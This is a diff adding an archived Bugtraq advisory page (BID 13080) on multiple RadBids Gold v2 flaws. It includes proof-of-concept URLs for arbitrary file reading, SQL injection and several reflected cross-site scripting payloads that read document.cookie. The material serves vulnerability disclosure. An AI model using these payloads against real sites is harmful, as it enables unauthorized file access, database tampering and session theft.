@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid13080<p><b><span style="font-size: 18pt;">RadScripts RadBids Gold Multiple Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13080/info">info</a><br><a href="http://www.securityfocus.com/bid/13080/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13080/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13080/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13080/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				13080
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2005-1073<br/>
+				
+					CVE-2005-1074<br/>
+				
+					CVE-2005-1075<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 09 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 12:56PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to dcrab &lt;dcrab@hackerscenter.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					RadScripts RadBids Gold  v2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept examples are available:<br/><br/>http://www.example.com/auciton_software/index.php?read=arbitary_file<br/><br/>http://www.example.com/auciton_software/index.php?a=listings&amp;amp;mode='SQL_INJECTION&amp;amp;order=name&amp;amp;cat=<br/>SELECT id, area, radbids_listings.moderated, name, type, featured, hot, urgent, detailview, viewcount, COUNT(radbids_bids.pid) AS bids, AVG(radbids_bids.price) AS<br/>average, MAX(radbids_bids.dateposted) AS lastbid, radbids_listings.dateposted, UNIX_TIMESTAMP(radbids_listings.dateposted) AS pdate,<br/>UNIX_TIMESTAMP(dateexpire)-UNIX_TIMESTAMP(NOW()) AS timeleft, radbids_rate.avgrate, min_bid, bid_inc, buynow, dateawarded, listing_type FROM radbids_listings LEFT JOIN<br/>radbids_bids ON radbids_listings.id=radbids_bids.pid LEFT JOIN radbids_rate ON radbids_listings.id=radbids_rate.pid WHERE GROUP BY id ORDER BY name, dateposted DESC<br/>LIMIT 0,25<br/><br/>http://www.example.com/auciton_software/faq.php?farea=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/><br/>http://www.example.com/auciton_software/index.php?a=listings&amp;amp;mode=1&amp;amp;order=name&amp;amp;cat=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E<br/><br/>http://www.example.com/auciton_software/index.php?a=listings&amp;amp;mode=1&amp;amp;order='%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&amp;amp;cat=<br/><br/>http://www.example.com/auciton_software/index.php?a=myareas&amp;amp;area=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+	
+		<ul>
+</ul>
+</div>
